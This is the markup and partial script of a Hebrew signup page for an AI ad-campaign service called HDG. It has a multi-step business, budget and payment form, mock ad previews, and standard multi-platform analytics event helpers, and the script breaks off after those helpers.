      <svg class="logo-mark" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <rect x="1" y="1" width="30" height="30" rx="8" stroke="#fff" stroke-opacity="0.25" stroke-width="1.4"/>
        <path d="M8 21L14.5 13L18.5 16.5L23 9.5" stroke="#1877F2" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M17.5 9H23V14.5" stroke="#1877F2" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      <span class="logo-word">HDG</span>
    </a>
    <div class="header-right">
      <span class="secure-badge">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="5" y="10.5" width="14" height="9.5" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.8"/></svg>
        חיבור מאובטח ומאומת
      </span>
      <a href="/" class="back-link">
        חזרה
        <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M2 8H14M14 8L9.5 3.5M14 8L9.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </a>
    </div>
  </nav>
</header>

<main id="main">
  <div class="wrap">
    
    <!-- Hero description -->
    <section class="form-hero">
      <h1>בואו נקים את מנוע הלקוחות שלכם</h1>
      <p>כמה פרטים בסיסיים, ומערכת ה-AI שלנו תתחיל לבנות, לפרסם ולנהל קמפיינים אוטומטיים עבור העסק שלכם. בלי סיבוכים ובלי ידע מוקדם.</p>
    </section>

    <!-- Success state (Initially hidden) -->
    <section class="success-layout" id="successSection">
      <svg class="success-badge-icon" viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <circle cx="40" cy="40" r="36"/>
        <path d="M24 41L34.5 51.5L57 27"/>
      </svg>
      <h2>קמפיין ה-AI שלך נוצר בהצלחה!</h2>
      <p>המערכת הקימה עבורך דף נחיתה ייעודי, הגדירה מילות מפתח ממוקדות ויצרה את המודעות. תוך כשעתיים, המודעות שלך יחלו לרוץ בגוגל ובמטא ותתחיל לקבל פניות ישירות!</p>
      
      <div class="success-summary">
        <h4 class="success-summary-title">פרטי החשבון והקמפיין שלך:</h4>
        <div class="success-row"><span class="label">שם העסק</span><span class="value" id="successBusinessName">—</span></div>
        <div class="success-row"><span class="label">יעד קבלת פניות</span><span class="value" id="successGoal">—</span></div>
        <div class="success-row"><span class="label">אזור פעילות</span><span class="value" id="successLocation">—</span></div>
        <div class="success-row"><span class="label">תקציב פרסום יומי</span><span class="value highlight" id="successDailyBudget">—</span></div>
        <div class="success-row"><span class="label">חיוב חודשי משוער (פרסום + מערכת)</span><span class="value" id="successMonthlyTotal">—</span></div>
      </div>

      <a href="/" class="btn btn-primary" style="padding: 16px 40px; font-size: 17px;">
        כניסה ללוח הבקרה האישי
        <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </a>
    </section>

    <!-- Main setup layout -->
    <div class="layout-grid" id="setupLayout">
      
      <!-- Right Side: Interactive Setup Form -->
      <section class="form-column">
        
        <!-- Stepper indicator -->
        <div class="stepper-bar">
          <div class="stepper-step-info">
            <span class="step-label" id="stepIndicatorLabel">שלב 1 מתוך 4</span>
            <span class="step-title" id="stepIndicatorTitle">פרטי העסק שלך</span>
          </div>
          <div class="stepper-dots">
            <span class="stepper-dot active" data-dot="1"></span>
            <span class="stepper-dot" data-dot="2"></span>
            <span class="stepper-dot" data-dot="3"></span>
            <span class="stepper-dot" data-dot="4"></span>
          </div>
          <div class="stepper-progress" id="stepperProgressBar"></div>
        </div>

        <div class="form-card">
          <form id="campaignSetupForm" novalidate>
            
            <!-- ===== STEP 1: BUSINESS DETAILS ===== -->
            <div class="form-step active" data-step="1">
              <div class="step-head">
                <h2>ספרו לנו קצת על העסק</h2>
                <p>פרטים אלו יעזרו למערכת ה-AI לנסח מודעות מתאימות ולבחור את מילות המפתח המניבות ביותר עבורכם.</p>
              </div>

              <div class="field-group">
                <label class="field-label" for="businessName">שם העסק <span class="req">*</span></label>
                <input class="field-input" type="text" id="businessName" placeholder="למשל: סטודיו יופי אור, אינסטלציה מהירה" required>
                <span class="field-error" id="businessName-error">נא להזין את שם העסק</span>
              </div>

              <div class="field-group">
                <label class="field-label">תחום הפעילות של העסק <span class="req">*</span></label>
                <div class="category-grid" id="categoryGrid">
                  
                  <label class="category-card" for="catBeauty">
                    <input type="radio" name="category" id="catBeauty" class="category-radio" value="beauty" checked>
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"/></svg>
                    <span class="category-name">יופי ואסתטיקה</span>
                  </label>

                  <label class="category-card" for="catPlumbing">
                    <input type="radio" name="category" id="catPlumbing" class="category-radio" value="services">
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                    <span class="category-name">בעלי מקצוע</span>
                  </label>

                  <label class="category-card" for="catLaw">
                    <input type="radio" name="category" id="catLaw" class="category-radio" value="lawyer">
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
                    <span class="category-name">עורכי דין ופיננסים</span>
                  </label>

                  <label class="category-card" for="catFood">
                    <input type="radio" name="category" id="catFood" class="category-radio" value="food">
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364-6.364l-.707.707M6.343 17.657l-.707.707m0-12.728l.707.707m12.728 12.728l.707-.707M12 8a4 4 0 100 8 4 4 0 000-8z"/></svg>
                    <span class="category-name">מסעדות ומזון</span>
                  </label>

                  <label class="category-card" for="catShop">
                    <input type="radio" name="category" id="catShop" class="category-radio" value="shop">
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"/></svg>
                    <span class="category-name">חנויות אונליין</span>
                  </label>

                  <label class="category-card" for="catClinic">
                    <input type="radio" name="category" id="catClinic" class="category-radio" value="clinic">
                    <svg class="category-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                    <span class="category-name">רפואה ומרפאות</span>
                  </label>
                  
                </div>
              </div>

              <div class="field-group">
                <label class="field-label" for="businessDesc">תיאור קצר של השירותים שאתם מציעים <span class="req">*</span></label>
                <textarea class="field-input" id="businessDesc" rows="3" placeholder="למשל: מספרת כלבים מנוסה בהרצליה. אנחנו מציעים תספורות, רחצה, גזירת ציפורניים וטיפוח מלא לכל סוגי הכלבים ברמה הגבוהה ביותר." required></textarea>
                <span class="field-error" id="businessDesc-error">נא להזין תיאור קצר של העסק</span>
                <span class="field-hint">ה-AI שלנו ישתמש בזה כדי לכתוב עבורכם מודעות מושכות בגוגל ופייסבוק באופן אוטומטי.</span>
              </div>
            </div>

            <!-- ===== STEP 2: GOALS AND GEOGRAPHY ===== -->
            <div class="form-step" data-step="2">
              <div class="step-head">
                <h2>איך תרצו לקבל את הלקוחות?</h2>
                <p>בחרו את הדרך הנוחה ביותר עבורכם לקבל פניות חדשות וסמנו את אזור הפעילות הרלוונטי.</p>
              </div>

              <div class="field-group">
                <label class="field-label">מטרה עיקרית של הקמפיין <span class="req">*</span></label>
                <div class="goal-selector">
                  
                  <label class="goal-card" for="goalCalls">
                    <input type="radio" name="campaignGoal" id="goalCalls" class="goal-radio" value="calls" checked>
                    <span class="goal-check"></span>
                    <div class="goal-info">
                      <span class="goal-title">שיחות טלפון ישירות אליך</span>
                      <span class="goal-desc">מתאים לעסקים שנותנים מענה מהיר (למשל: בעלי מקצוע, מוניות, מרפאות חירום).</span>
                    </div>
                  </label>

                  <div class="goal-detail-input" id="callsInputWrapper">
                    <label class="field-label" for="targetPhone">מספר הטלפון לקבלת שיחות <span class="req">*</span></label>
                    <input class="field-input" type="tel" id="targetPhone" placeholder="050-0000000" dir="ltr" style="text-align:right;">
                    <span class="field-error" id="targetPhone-error">נא להזין מספר טלפון תקין לקבלת שיחות</span>
                  </div>

                  <label class="goal-card" for="goalWhatsapp">
                    <input type="radio" name="campaignGoal" id="goalWhatsapp" class="goal-radio" value="whatsapp">
                    <span class="goal-check"></span>
                    <div class="goal-info">
                      <span class="goal-title">הודעות וואטסאפ ישירות אליך</span>
                      <span class="goal-desc">מתאים למי שמעדיף להתכתב עם הלקוחות ולתאם תורים בכתב (למשל: סטודיו יופי, ייעוץ).</span>
                    </div>
                  </label>

                  <div class="goal-detail-input" id="whatsappInputWrapper" style="display:none;">
                    <label class="field-label" for="targetWhatsapp">מספר הוואטסאפ לקבלת הודעות <span class="req">*</span></label>
                    <input class="field-input" type="tel" id="targetWhatsapp" placeholder="050-0000000" dir="ltr" style="text-align:right;">
                    <span class="field-error" id="targetWhatsapp-error">נא להזין מספר וואטסאפ תקין</span>
                  </div>

                  <label class="goal-card" for="goalLeads">
                    <input type="radio" name="campaignGoal" id="goalLeads" class="goal-radio" value="leads">
                    <span class="goal-check"></span>
                    <div class="goal-info">
                      <span class="goal-title">השארת פרטים (לידים) בטופס</span>
                      <span class="goal-desc">אנחנו נקים עבורכם דף נחיתה אוטומטי מותאם ל-AI, הלקוחות ישאירו שם שם וטלפון ותקבלו התראה.</span>
                    </div>
                  </label>
                  
                </div>
              </div>

              <div class="field-group">
                <label class="field-label" for="targetLocation">באילו אזורים נפרסם את העסק שלך? <span class="req">*</span></label>
                <select class="field-input" id="targetLocation" required>
                  <option value="מרכז" selected>אזור המרכז וגוש דן</option>
                  <option value="ארצי">כל הארץ (ארצי)</option>
                  <option value="צפון">אזור הצפון וחיפה</option>
                  <option value="דרום">אזור הדרום ובאר שבע</option>
                  <option value="ירושלים">ירושלים והסביבה</option>
                  <option value="מקומי">סביב כתובת ספציפית (רדיוס מקומי)</option>
                </select>
              </div>

              <div class="field-group" id="localCityGroup" style="display:none;">
                <label class="field-label" for="localAddress">הכתובת המדויקת של העסק שלך <span class="req">*</span></label>
                <input class="field-input" type="text" id="localAddress" placeholder="למשל: אבן גבירול 50, תל אביב">
                <span class="field-error" id="localAddress-error">נא להזין כתובת לעסק</span>
              </div>
            </div>

            <!-- ===== STEP 3: BUDGET AND SYSTEM FEE ===== -->
            <div class="form-step" data-step="3">
              <div class="step-head">
                <h2>קבעו את התקציב שלכם</h2>
                <p>אצלנו אין חבילות כובלות. אתם מגדירים תקציב פרסום יומי מדויק והמערכת מנהלת אותו באופן אופטימלי. ניתן לשנות או לעצור בכל עת.</p>
              </div>

              <div class="budget-container">
                <div class="budget-header">
                  <span class="field-label" style="margin-bottom:0;">תקציב פרסום יומי</span>
                  <div class="budget-display">
                    <span class="budget-value" id="budgetValue">₪120</span>
                    <span class="budget-period">/ ליום</span>
                  </div>
                </div>

                <div class="slider-wrapper">
                  <input type="range" class="custom-slider" id="budgetRange" min="5" max="500" step="5" value="120" aria-label="תקציב יומי בשקלים">
                  <div class="slider-labels">
                    <span>₪5 ליום</span>
                    <span>₪500 ליום</span>
                  </div>
                </div>
              </div>

              <!-- AI Dynamic recommendation box -->
              <div class="ai-recommendation-box" id="aiRecBox">
                <div class="ai-rec-header">
                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                  המלצת ה-AI לתחום שלך
                </div>
                <div class="ai-rec-text" id="aiRecText">
                  על סמך ניתוח של 1,420 עסקים דומים בתחום <strong>יופי ואסתטיקה</strong> באזור <strong>המרכז</strong>, מומלץ להגדיר תקציב של לפחות ₪120 ביום כדי להשיג זרימה יציבה של לקוחות.
                </div>
                <div class="ai-rec-action" id="applyAiRec">
                  החל את תקציב ה-AI המומלץ (₪120 ליום)
                </div>
              </div>

              <h3 style="font-size: 16px; font-weight: 800; margin-bottom: 12px; color: var(--navy-950);">הערכת תוצאות חודשית משוערת:</h3>
              <div class="estimation-grid">
                <div class="estimation-card">
                  <span class="est-label">פניות/לקוחות בחודש</span>
                  <span class="est-val highlight" id="estLeads">30 - 65 פניות</span>
                </div>
                <div class="estimation-card">
                  <span class="est-label">חשיפה ללקוחות רלוונטיים</span>
                  <span class="est-val" id="estReach">12.5k - 28k</span>
                </div>
              </div>

              <div class="pricing-breakdown">
                <h4 style="font-size: 14px; font-weight: 800; color: var(--navy-950); margin-bottom: 10px;">פירוט עלויות שקוף לחלוטין:</h4>
                <div class="price-row">
                  <span>תקציב פרסום לגוגל ומטא (מדיה)</span>
                  <span id="calcMedia">₪3,600 / חודש</span>
                </div>
                <div class="price-row">
                  <span>עמלת מערכת ואופטימיזציית AI קבועה</span>
                  <span>₪0 / יום</span>
                </div>
                <div class="price-row total">
                  <span>סה"כ חיוב משוער</span>
                  <span id="calcTotal">₪3,850 / חודש</span>
                </div>
                <span class="field-hint" style="text-align: center; margin-top: 12px;">תקציב המדיה הולך במלואו ישירות למימון הקליקים ברשתות הפרסום.</span>
              </div>
            </div>

            <!-- ===== STEP 4: CHECKOUT AND PERSONAL DETAILS ===== -->
            <div class="form-step" data-step="4">
              <div class="step-head">
                <h2>פרטים אישיים ותשלום</h2>
                <p>הקמת החשבון והגדרת התשלום לקמפיין. החיוב יבוצע רק לאחר אישור המודעות על ידי ה-AI ועליית הקמפיין לאוויר.</p>
              </div>

              <div class="field-grid">
                <div class="field-group">
                  <label class="field-label" for="clientName">שם מלא <span class="req">*</span></label>
                  <input class="field-input" type="text" id="clientName" placeholder="ישראל ישראלי" required>
                  <span class="field-error" id="clientName-error">נא להזין שם מלא</span>
                </div>
                
                <div class="field-group">
                  <label class="field-label" for="clientEmail">כתובת אימייל <span class="req">*</span></label>
                  <input class="field-input" type="email" id="clientEmail" placeholder="name@domain.co.il" required>
                  <span class="field-error" id="clientEmail-error">נא להזין כתובת אימייל תקינה</span>
                </div>

                <div class="field-group">
                  <label class="field-label" for="clientPhone">טלפון אישי ליצירת קשר <span class="req">*</span></label>
                  <input class="field-input" type="tel" id="clientPhone" placeholder="050-0000000" dir="ltr" style="text-align:right;" required>
                  <span class="field-error" id="clientPhone-error">נא להזין טלפון נייד תקין</span>
                </div>
              </div>

              <div style="border-top: 1px solid var(--line-light); padding-top: 24px; margin-top: 24px;">
                <label class="field-label">כרטיס אשראי לחיוב <span class="req">*</span></label>
                
                <!-- Credit Card Preview -->
                <div class="card-container">
                  <div class="credit-card" id="creditCardPreview">
                    <div class="card-face card-front">
                      <div class="card-logo-row">
                        <div class="card-chip"></div>
                        <span class="card-brand-logo" id="cardBrand">VISA</span>
                      </div>
                      <div class="card-number-disp" id="cardNumberPreview">•••• •••• •••• ••••</div>
                      <div class="card-bottom-row">
                        <div class="card-holder-disp">בעל הכרטיס<span id="cardHolderPreview">—</span></div>
                        <div class="card-expiry-disp">תוקף<span id="cardExpiryPreview">MM/YY</span></div>
                      </div>
                    </div>
                    <div class="card-face card-back">
                      <div class="card-magnetic-strip"></div>
                      <div class="card-signature-box">
                        <div class="card-signature" id="cardCvvPreview">CVV</div>
                      </div>
                      <div style="padding: 0 24px 10px; font-size: 8px; color: var(--slate-light); text-align: left;">
                        SECURE PAYMENTS BY HDG INC.
                      </div>
                    </div>
                  </div>
                </div>

                <!-- Credit Card Fields -->
                <div class="field-group">
                  <label class="field-label" for="cardHolder">שם בעל הכרטיס (באנגלית או עברית) <span class="req">*</span></label>
                  <input class="field-input" type="text" id="cardHolder" placeholder="כפי שמופיע על הכרטיס" required>
                  <span class="field-error" id="cardHolder-error">נא להזין את שם בעל הכרטיס</span>
                </div>

                <div class="field-group">
                  <label class="field-label" for="cardNumber">מספר כרטיס אשראי <span class="req">*</span></label>
                  <input class="field-input" type="text" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" dir="ltr" style="text-align:right;" required>
                  <span class="field-error" id="cardNumber-error">נא להזין מספר כרטיס אשראי תקין</span>
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px;">
                  <div class="field-group">
                    <label class="field-label" for="cardExpiry">תוקף <span class="req">*</span></label>
                    <input class="field-input" type="text" id="cardExpiry" placeholder="MM/YY" inputmode="numeric" dir="ltr" style="text-align:right;" required>
                    <span class="field-error" id="cardExpiry-error">תוקף פג או שגוי</span>
                  </div>
                  <div class="field-group">
                    <label class="field-label" for="cardCvv">CVV <span class="req">*</span></label>
                    <input class="field-input" type="text" id="cardCvv" placeholder="123" inputmode="numeric" dir="ltr" style="text-align:right;" required>
                    <span class="field-error" id="cardCvv-error">3 או 4 ספרות</span>
                  </div>
                </div>
              </div>

              <div style="display: flex; gap: 10px; align-items: flex-start; margin-top: 16px;">
                <input type="checkbox" id="termsCheck" style="width: 18px; height: 18px; accent-color: var(--amber); margin-top: 3px;" required>
                <label for="termsCheck" style="font-size: 13.5px; color: var(--slate); line-height: 1.5;">
                  אני מאשר/ת את <a href="#" style="color: var(--amber-deep); font-weight: 700; text-decoration: underline;">תנאי השימוש</a> ומסכים/ה להתחלת הטיפול בקמפיין. ניתן לבטל את השירות בכל עת ללא קנס ביטול.
                </label>
              </div>
              <span class="field-error" id="termsCheck-error">עליך לאשר את תנאי השירות כדי להמשיך</span>
            </div>

            <!-- Form navigation buttons -->
            <div class="form-nav">
              <button type="button" class="btn btn-ghost" id="btnBackStep" style="visibility: hidden;">
                <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" style="transform: rotate(180deg);"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
                חזרה
              </button>
              <span class="spacer"></span>
              <button type="button" class="btn btn-primary" id="btnNextStep">
                להגדרת היעד
                <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
              </button>
            </div>

          </form>
        </div>
      </section>

      <!-- Left Side: AI Live Campaign Preview -->
      <aside class="preview-column">
        <div class="ai-preview-panel">
          <div class="preview-header">
            <h3>
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
              תצוגת מודעות AI חיה
            </h3>
            <div class="preview-live-pulse">
              <span class="preview-pulse-dot"></span>
              מתעדכן בזמן אמת
            </div>
          </div>
          
          <div class="preview-tabs">
            <div class="preview-tab active" id="tabGoogle">מודעת גוגל</div>
            <div class="preview-tab" id="tabFacebook">מודעת פייסבוק</div>
          </div>

          <div class="preview-content">
            
            <div class="preview-empty-state" id="previewEmptyState" style="display: none;">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>
              <p>הקלידו שם עסק ותיאור כדי לראות את כתיבת המודעות החיה של ה-AI.</p>
            </div>

            <!-- Google Mockup Card -->
            <div class="preview-card active" id="cardGoogleMockup">
              <div class="google-ad">
                <div class="google-ad-header">
                  <span class="google-ad-sponsor">ממומן</span>
                  <span class="google-ad-url" id="googleAdUrl">https://www.hdg.co.il/hair-salon</span>
                </div>
                <div class="google-ad-title" id="googleAdTitle">
                  קוסמטיקה וטיפולי יופי ברמה הגבוהה ביותר | סטודיו יופי אור
                </div>
                <div class="google-ad-desc" id="googleAdDesc">
                  מחפשים יופי ואסתטיקה באיכות ללא פשרות? סטודיו יופי אור מציע מגוון טיפולים מותאמים אישית. היכנסו לפרטים ותיאום תור מהיר!
                </div>
              </div>
            </div>

            <!-- Facebook Mockup Card -->
            <div class="preview-card" id="cardFacebookMockup">
              <div class="facebook-ad">
                <div class="fb-ad-header">
                  <div class="fb-profile-img" id="fbProfileChar">ס</div>
                  <div class="fb-profile-info">
                    <div class="fb-profile-name" id="fbProfileName">סטודיו יופי אור</div>
                    <div class="fb-ad-time">
                      <span>ממומן</span> · 
                      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 100 16A8 8 0 008 0zm.5 12h-1V7.5h1V12zm0-5.5h-1v-1h1v1z"/></svg>
                    </div>
                  </div>
                </div>
                <div class="fb-ad-text" id="fbAdText">
                  מחפשים יופי ואסתטיקה באיכות ללא פשרות? סטודיו יופי אור מציע מגוון טיפולים מותאמים אישית. פנו אלינו לתיאום מהיר!
                </div>
                <div class="fb-ad-media">
                  <div class="fb-ad-media-overlay"></div>
                  <div class="fb-ad-media-text">
                    <div class="fb-ad-media-title" id="fbMediaTitle">סטודיו יופי אור</div>
                    <div class="fb-ad-media-sub" id="fbMediaSub">יופי ואסתטיקה · פתרונות מתקדמים</div>
                  </div>
                </div>
                <div class="fb-ad-footer">
                  <div class="fb-ad-footer-info">
                    <div class="fb-ad-footer-domain">HDG.CO.IL</div>
                    <div class="fb-ad-footer-title" id="fbFooterTitle">סטודיו יופי אור - שירות מנצח</div>
                  </div>
                  <div class="fb-ad-cta-btn" id="fbAdCtaText">התקשרו עכשיו</div>
                </div>
              </div>
            </div>

          </div>
        </div>
      </aside>

    </div>
  </div>
</main>

<!-- AI Campaign Creation Loader Overlay -->
<div class="loader-overlay" id="loaderOverlay">
  <div class="loader-card">
    <div class="loader-spinner-wrap">
      <div class="loader-spinner"></div>
      <svg class="loader-sparkle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 2a1 1 0 011 1v1h1a1 1 0 010 2H6v1a1 1 0 11-2 0V6H3a1 1 0 110-2h1V3a1 1 0 011-1zm0 10a1 1 0 011 1v1h1a1 1 0 110 2H6v1a1 1 0 11-2 0v-1H3a1 1 0 110-2h1v-1a1 1 0 011-1zm7-10a1 1 0 011 .725l1.586 3.704 3.704 1.586a1 1 0 010 1.858l-3.704 1.586-1.586 3.704a1 1 0 01-1.858 0l-1.586-3.704-3.704-1.586a1 1 0 010-1.858l3.704-1.586 1.586-3.704A1 1 0 0112 2z" clip-rule="evenodd"/></svg>
    </div>
    
    <div class="loader-title">מנוע ה-AI מקים את הקמפיין...</div>
    <div class="loader-desc" id="loaderProgressDesc">מנתח את פרטי העסק ומייצר מילות מפתח ממוקדות...</div>
    
    <div class="loader-steps">
      <div class="loader-step active" id="lStep1">
        <span class="loader-step-dot">1<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 8.5L6.5 12L13 4.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
        ניתוח העסק ומחקר מילות מפתח
      </div>
      <div class="loader-step" id="lStep2">
        <span class="loader-step-dot">2<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 8.5L6.5 12L13 4.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
        ניסוח מודעות וקופירייטינג שיווקי
      </div>
      <div class="loader-step" id="lStep3">
        <span class="loader-step-dot">3<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 8.5L6.5 12L13 4.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
        חיבור מטרת הקמפיין ויצירת ערוצי המרה
      </div>
      <div class="loader-step" id="lStep4">
        <span class="loader-step-dot">4<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 8.5L6.5 12L13 4.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
        הגדרת תקציב וחלוקה אופטימלית ברשתות
      </div>
    </div>
  </div>
</div>

<footer>
  <div class="wrap">© 2026 HDG. כל הזכויות שמורות. מערכת פרסום דיגיטלי מנוהלת AI.</div>
</footer>

<script>
document.addEventListener('DOMContentLoaded', function () {
  var currentStep = 1;
  var totalSteps = 4;

  // ============================================================
  // TRACKING HELPERS — signup.php (Multi-step Funnel)
  // ============================================================

  /**
   * Fire a tracking event across ALL platforms simultaneously.
   * Wraps: Meta Pixel, GA4 (gtag), Google Ads Conversion, TikTok Pixel, Snapchat Pixel, GTM dataLayer.
   * @param {string} eventName  - Canonical FB Standard Event name (e.g. 'Lead', 'CompleteRegistration')
   * @param {Object} params     - Additional event parameters
   */
  function trackEvent(eventName, params) {
    params = params || {};

    // — Meta (Facebook) Pixel —
    try {
      if (window.fbq) fbq('track', eventName, params);
    } catch(e) {}

    // — Google Analytics 4 —
    try {
      if (window.gtag) {
        var ga4Map = {
          'Lead':               'generate_lead',
          'ViewContent':        'view_item',
          'InitiateCheckout':   'begin_checkout',
          'AddPaymentInfo':     'add_payment_info',
          'CompleteRegistration':'sign_up',
          'Contact':            'contact',
          'Schedule':           'schedule'
        };
        gtag('event', ga4Map[eventName] || eventName.toLowerCase().replace(/ /g,'_'), params);
      }
    } catch(e) {}

    // — Google Ads Conversion (CompleteRegistration = primary conversion) —
    try {
      if (window.gtag) {
        var conversionMap = {
          'Lead':               'AW-XXXXXXXXXX/XXXXXXXXXXXXXX', // Lead conversion
          'CompleteRegistration':'AW-XXXXXXXXXX/XXXXXXXXXXXXXX'  // Purchase/Signup conversion
        };
        if (conversionMap[eventName]) {
          gtag('event', 'conversion', {
            send_to: conversionMap[eventName],
            value: params.value || 1.0,
            currency: params.currency || 'ILS'
          });
        }
      }
    } catch(e) {}

    // — TikTok Pixel —
    try {
      if (window.ttq) {
        var ttqMap = {
          'Lead':               'SubmitForm',
          'ViewContent':        'ViewContent',
          'InitiateCheckout':   'InitiateCheckout',
          'AddPaymentInfo':     'AddPaymentInfo',
          'CompleteRegistration':'CompleteRegistration',
          'Contact':            'Contact'
        };
        ttq.track(ttqMap[eventName] || eventName, params);
      }
    } catch(e) {}

    // — Snapchat Pixel —
    try {
      if (window.snaptr) {
        var snapMap = {
          'Lead':               'SIGN_UP',
          'ViewContent':        'VIEW_CONTENT',
          'InitiateCheckout':   'START_CHECKOUT',
          'AddPaymentInfo':     'ADD_BILLING',
          'CompleteRegistration':'PURCHASE',
          'Contact':            'SUBSCRIBE'
        };
        snaptr('track', snapMap[eventName] || 'CUSTOM_EVENT_1', params);
      }
    } catch(e) {}

    // — GTM dataLayer push —
    try {
      window.dataLayer = window.dataLayer || [];
      dataLayer.push({
        event: 'custom_event',
        eventName: eventName,
        eventParams: params
      });
    } catch(e) {}
  }

  /**
   * Fire a custom / non-standard event (GA4 + GTM only).
   * Used for granular funnel steps (e.g. 'funnel_step_complete').
   */
  function trackCustom(eventName, params) {
    params = params || {};
    try {
      if (window.fbq) fbq('trackCustom', eventName, params);
    } catch(e) {}
    try {
      if (window.gtag) gtag('event', eventName, params);
    } catch(e) {}
    try {
      if (window.ttq) ttq.track(eventName, params);
    } catch(e) {}
    try {
      window.dataLayer = window.dataLayer || [];
      dataLayer.push({ event: eventName, eventParams: params });
    } catch(e) {}
  }

  // ---- Page-load event: ViewContent (signup funnel start) ----
  trackEvent('ViewContent', {
    content_name: 'Signup Funnel — HDG',
    content_category: 'Lead Generation',
    content_type: 'registration_form'
  });

  // ============================================================
  // END TRACKING HELPERS DECLARATION
  // (actual event fires are placed throughout the funnel below)
